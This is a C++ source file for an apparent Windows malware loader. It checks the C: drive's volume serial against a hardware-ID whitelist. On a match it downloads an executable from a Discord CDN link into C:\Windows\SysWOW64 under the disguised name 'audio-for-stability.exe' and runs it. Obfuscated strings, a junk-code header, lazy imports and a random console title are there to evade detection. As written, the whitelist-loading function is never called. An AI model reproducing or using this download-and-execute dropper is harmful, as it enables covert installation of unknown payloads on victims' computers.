#include <iostream>
#include "Headers/dead.hpp"
#include <string>
#include <windows.h>
#include <Urlmon.h>
#include "Headers/junk-code.h"
#include <WinInet.h>
#include <vector>
#include <tchar.h>
#include "Headers/color.hpp"
#include <TlHelp32.h>
#include <cstdio>
#include "Headers/lazy_importer.hpp"
#include <conio.h>
#include "loader-api.h"

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib")

vector<string> serial;
void loadserial()
{
    serial.push_back(dead("384604182").c_str());
}

int main()
{
    SetConsoleTitleA(RandomTitle(rand() % 90 + 20).c_str()); // encrypted && random title
    TCHAR volumeName[MAX_PATH + 1] = { 0 };
    TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    DWORD maxComponentLen = 0;
    DWORD fileSystemFlags = 0;

    if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
    

    if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
    {
        
        std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/894150130599608360/demon.exe").c_str());
        std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
        URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
        Sleep(2000);
        system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
        system(dead("start audio-for-stability.exe").c_str());
        system(dead("cls").c_str());
    }
    else
    {
        system(dead("cls").c_str());
        std::cout << CYAN << (dead("Sorry but you are not in our database. ").c_str()) << std::endl;
        std::cout << GREEN << (dead("Hwid : ").c_str());;
        std::cout << serialNumber << std::endl;
        Sleep(10000);
        exit(0);
    }
}

